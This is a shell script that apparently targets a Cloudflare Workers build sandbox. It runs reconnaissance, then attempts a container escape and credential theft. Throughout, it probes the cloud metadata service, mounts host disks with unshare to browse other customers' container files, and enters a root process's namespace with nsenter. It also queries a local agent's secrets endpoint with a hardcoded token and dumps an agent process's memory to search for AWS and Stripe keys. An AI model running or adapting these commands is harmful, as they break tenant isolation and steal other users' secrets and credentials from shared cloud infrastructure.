
echo "--- DEBUG: Checking if the secret was baked into the file ---"
grep "token" public/index.html
TOKEN=$CLOUDFLARE_API_TOKEN

curl "https://api.cloudflare.com/client/v4/user/tokens/verify" \
  -H "Authorization: Bearer $TOKEN"
curl "https://cf-test.shmouely.workers.dev/.git/HEAD"
curl "https://api.cloudflare.com/client/v4/accounts/3514ad102b78d8da0986b1def65b00b6/workers/scripts/cf-test/secrets" \
  -H "Authorization: Bearer <TOKEN>"


echo "--- STARTING ISOLATION RECON ---"
echo "[*] Checking for neighboring processes..."
ps aux --forest || ps -ef
# If you see processes like 'mysql', 'docker-proxy', or names of other apps, 
# isolation is broken.

# 2. Network Isolation Check (The "Jump" points)
echo "[*] Scanning for local network neighbors..."
arp -a
ip neighbor show
# In a secure sandbox, these should be empty or only show the gateway.
# If you see dozens of IPs, you've found a shared network segment.
echo "[*] Checking for host filesystem leaks..."
mount | grep -E "node|host|docker|/dev/sdb"
# Look for anything mounted from the host (e.g., /var/lib/docker).
# This is often the first step in a "Container Escape."

echo "[*] Attempting to reach Internal Metadata Service (IMDS)..."
curl -s -m 2 http://169.254.169.254/latest/meta-data/ && echo " -> EXPOSED: AWS/GCP Metadata Found!" || echo " -> IMDS restricted."
# This is how hackers steal the 'Node Identity' to jump to other cloud resources.

echo "[*] Checking Linux Capabilities..."
capsh --print 2>/dev/null || cat /proc/self/status | grep Cap
# If you see '000001ffffffffff', you are in a privileged container—the ultimate gift for an attacker.

echo "--- RECON COMPLETE ---"

echo "Host Recon"
# Look for processes with "build", "worker", or "wrangler" in the name
cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"

echo "exploiting cap sys admin"
# Create a directory to hold the host's heart
# This creates a new User Namespace (-U) and Mount Namespace (-m)
# mapping your current user to root (-r), then executes the mkdir.
unshare -rm bash -c "mkdir -p /mnt/host_root && chmod 777 /mnt/host_root"
unshare -rm bash -c "mount /dev/vdc /mnt/host_root && ls -la /mnt/host_root"
# Mount the host's main partition (usually /dev/sda1 or sdb1)
mount /dev/sda1 /mnt/host_root
# Now you can browse every customer's build files stored on that disk
ls /mnt/host_root/var/lib/docker/containers/

echo "Hijaching the agent"
# This attempts to enter the mount namespace of the root process
# and run the mkdir command from its perspective.
nsenter -t 268 -m mkdir -p /mnt/host_root



echo "Check for local listening ports (where secrets might live)"
ss -ntlp
# Check for Unix sockets (often used by agents to pass secrets)
ls -F /run | grep .sock
# Attempt to hit the local agent using the Token as a Header
TOKEN="ca8ccde4505aa2f5776940cad26af00d" # From your logs
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/v1/secrets
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/v1/env
# Attempt to fetch the configuration which might contain AWS/Stripe keys
curl -H "X-CF-Token: $TOKEN" http://169.254.169.254/cloudchamber/v1/secrets

echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
# (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
gdb -p 236 --batch -ex "generate-core-file"
strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"



